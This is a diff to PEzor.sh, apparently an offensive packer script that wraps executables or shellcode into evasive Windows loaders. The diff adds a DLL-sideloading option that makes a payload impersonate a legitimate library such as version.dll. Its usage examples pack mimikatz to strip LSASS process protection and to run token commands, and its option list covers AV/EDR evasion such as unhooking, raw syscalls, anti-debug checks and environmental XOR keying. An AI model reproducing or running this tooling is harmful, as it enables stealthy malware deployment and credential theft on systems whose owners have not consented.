@@ -21,6 +21,7 @@ INSTALL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 TMP_DIR=`mktemp -d`
 SGN=false
 BLOB=false
+OUTPUT_DIR=false
 IS_SHELLCODE=false
 BITS=64
 FORCED_BITS=false
@@ -42,6 +43,9 @@ CLEANUP=false
 SOURCES=""
 FLUCTUATE=false
 XOR_KEY=false
+DLL_SIDELOAD=false
+ORIGINAL_DLL=false
+NEW_DLL_NAME=false
 
 usage() {
     echo 'Usage PE:        ./PEzor.sh [-32|-64] [-debug] [-syscalls] [-unhook] [-sleep=<SECONDS>] [-sgn] [-antidebug] [-text] [-self] [-rx] [-format=<FORMAT>] <executable.exe> [donut args]'
@@ -58,7 +62,7 @@ OPTIONS
   -debug                    Generate a debug build
   -unhook                   User-land hooks removal
   -antidebug                Add anti-debug checks
-  -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
+  -syscalls                 Use raw syscalls [64-bit only] [Windows 10+ only]
   -sgn                      Encode the generated shellcode with sgn
   -text                     Store shellcode in .text section instead of .data
   -rx                       Allocate RX memory for shellcode
@@ -69,6 +73,7 @@ OPTIONS
   -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
   -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()
   -xorkey=KEY               Encrypt payload with a simple multibyte XOR, it retrieves the key at runtime by using GetComputerNameExA(ComputerNameDnsFullyQualified)
+  -dll-sideload=DLL         Generate a DLL that will proxy the execution to another library
   [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2
 
 EXAMPLES
@@ -85,11 +90,15 @@ EXAMPLES
   # 64-bit (use environmental keying with GetComputerNameExA)
   $ PEzor.sh -xorkey=MY-FQDN-MACHINE-NAME -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -p '\"coffee\" \"sleep 5000\" \"coffee\" \"exit\"'
   # 64-bit (support EXEs with resource by keeping PE headers in memory)
-  $ PEzor.sh -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -k 1 -p '\"coffee\" \"sleep 5000\" \"coffee\" \"exit\"'
+  $ PEzor.sh -sleep=120 mimikatz/x64/mimikatz.exe -z 2 -k 2 -p '\"!+\" \"!processprotect\" \"/process:lsass.exe\" \"/remove\" \"!-\" \"exit\"'
   # 64-bit (beacon object file)
   $ PEzor.sh -format=bof mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
   # 64-bit (beacon object file w/ cleanup)
   $ PEzor.sh -format=bof -cleanup mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
+  # 64-bit (dll)
+  $ PEzor.sh -format=dll mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
+  # 64-bit (dll sideload)
+  $ PEzor.sh -format=dll -dll-sideload=version.dll mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
   # 64-bit (reflective dll)
   $ PEzor.sh -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2 -p '\"log c:\users\public\mimi.out\" \"token::whoami\" \"exit\"'
   # 64-bit (service exe)
@@ -119,7 +128,7 @@ OPTIONS
   -unhook                   User-land hooks removal
   -antidebug                Add anti-debug checks
   -shellcode                Force shellcode detection
-  -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
+  -syscalls                 Use raw syscalls [64-bit only] [Windows 10+ only]
   -sgn                      Encode the provided shellcode with sgn
   -text                     Store shellcode in .text section instead of .data
   -rx                       Allocate RX memory for shellcode
@@ -129,6 +138,7 @@ OPTIONS
   -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll, dotnet, dotnet-createsection, dotnet-pinvoke)
   -fluctuate=PROTECTION     Fluctuate memory region to PROTECTION (RW or NA) by hooking Sleep()
   -xorkey=KEY               Encrypt payload with a simple multibyte XOR, it retrieves the key at runtime by using GetComputerNameExA(ComputerNameDnsFullyQualified)
+  -dll-sideload=DLL         Generate a DLL that will proxy the execution to another library
 
 EXAMPLES
   # 64-bit (self-inject RWX)
@@ -149,6 +159,10 @@ EXAMPLES
   $ PEzor.sh -format=bof shellcode.bin
   # 64-bit (beacon object file w/ cleanup)
   $ PEzor.sh -format=bof -cleanup shellcode.bin
+  # 64-bit (dll)
+  $ PEzor.sh -format=dll shellcode.bin
+  # 64-bit (dll sideload)
+  $ PEzor.sh -format=dll -dll-sideload=version.dll shellcode.bin
   # 64-bit (reflective dll)
   $ PEzor.sh -format=reflective-dll shellcode.bin
   # 64-bit (service exe)
@@ -258,10 +272,15 @@ do
             XOR_KEY="${arg#*=}"
             echo "[?] XOR key: $XOR_KEY"
             ;;
+        -dll-sideload=*)
+            DLL_SIDELOAD="${arg#*=}"
+            echo "[?] DLL to sideload: $DLL_SIDELOAD"
+            ;;
         *)
             echo "[?] Processing $arg"
             ls $arg 1>/dev/null 2>&1 || { echo "[x] ERROR: $arg doesn't exist"; exit 1; }
             BLOB=$arg
+            OUTPUT_DIR=$(dirname -- $BLOB)
             break
             ;;
     esac
@@ -298,6 +317,11 @@ fi
 
 if [ $RX = true ] && [ $SGN = true ]; then
     echo '[x] Error: cannot encode the shellcode when self-executing the payload'
+    exit 1
+fi
+
+if [ $SELF = true ] && [ $OUTPUT_FORMAT == "dll" -o $OUTPUT_FORMAT == "service-dll" -o $OUTPUT_FORMAT == "reflective-dll"]; then
+    echo '[x] Error: cannot self-execute the payload when targeting DLLs'
     exit 1
 fi
 
@@ -499,6 +523,34 @@ case $OUTPUT_FORMAT in
             SOURCES="$SOURCES $INSTALL_DIR/fluctuate.cpp"
         fi &&
 
+        if [ $OUTPUT_FORMAT = "dll" -o $OUTPUT_FORMAT = "service-dll" -o $OUTPUT_FORMAT == "reflective-dll" ] && [ $DLL_SIDELOAD != false ]; then
+            SOURCES="$SOURCES $TMP_DIR/sideload.def"
+            ORIGINAL_DLL=$(basename -- "$DLL_SIDELOAD")
+            original_dll_name="${ORIGINAL_DLL%.*}"
+            new_dll="$original_dll_name""$RANDOM"
+            NEW_DLL_NAME="$new_dll.dll"
+            winedump dump -C -j export "$DLL_SIDELOAD" | \
+            awk '
+                BEGIN {
+                    print "EXPORTS"
+                }
+                /Entry/,/Done/ {
+                    if ($2 ~ /^[0-9]+/) {
+                        ordinal = $2
+                        name = $3
+                        new_dll = "'${new_dll}'"
+                        if (name ~ /</) { 
+                            # Exported by ordinal (TODO: syntax error in .def file)
+                            # printf "    @%s=%s.#%s @%s\n", ordinal, new_dll, ordinal, ordinal
+                        } else if (name !~ /DllMain/){
+                            # Exported function with a name
+                            printf "    %s=%s.%s @%s\n", name, new_dll, name, ordinal
+                        }
+                    }                            
+                }
+            ' > $TMP_DIR/sideload.def || exit 1
+        fi &&
+
         if [ $OUTPUT_FORMAT = "bof" ]; then
             # $CXX $CPPFLAGS $CXXFLAGS -Wl,--disable-auto-import -Wl,--disable-runtime-pseudo-reloc $TMP_DIR/shellcode.cpp -c -o $TMP_DIR/shellcode.o
             # $CXX $CPPFLAGS $CXXFLAGS $TMP_DIR/sleep.cpp -c -o $TMP_DIR/sleep.o &&
@@ -513,6 +565,7 @@ case $OUTPUT_FORMAT in
             # x86_64-w64-mingw32-ld -r $TMP_DIR/{sleep,bof,inject}.o -o $BLOB.packed.$OUTPUT_EXTENSION
         else
             CXXFLAGS="-std=c++17 -static"
+            echo $CXX $CPPFLAGS $CXXFLAGS $INSTALL_DIR/{inject,PEzor}.cpp $TMP_DIR/{shellcode,sleep}.cpp $SOURCES -o $BLOB.packed.$OUTPUT_EXTENSION &&
             $CXX $CPPFLAGS $CXXFLAGS $INSTALL_DIR/{inject,PEzor}.cpp $TMP_DIR/{shellcode,sleep}.cpp $SOURCES -o $BLOB.packed.$OUTPUT_EXTENSION &&
             strip $BLOB.packed.$OUTPUT_EXTENSION || exit 1
         fi
@@ -585,5 +638,9 @@ case $OUTPUT_FORMAT in
         ;;
 esac &&
 
-rm -rf $TMP_DIR &&
-echo -n '[!] Done! Check '; file $BLOB.packed.$OUTPUT_EXTENSION
+#rm -rf $TMP_DIR &&
+echo -n '[!] Done! Check '; file $BLOB.packed.$OUTPUT_EXTENSION &&
+if [ $OUTPUT_FORMAT = "dll" -o $OUTPUT_FORMAT = "service-dll" -o $OUTPUT_FORMAT == "reflective-dll" ] && [ $DLL_SIDELOAD != false ]; then
+    cp "$DLL_SIDELOAD" "$OUTPUT_DIR/$NEW_DLL_NAME" &&
+    echo "[?] Rename $BLOB.packed.$OUTPUT_EXTENSION to $ORIGINAL_DLL and copy in the same directory $NEW_DLL_NAME"
+fi
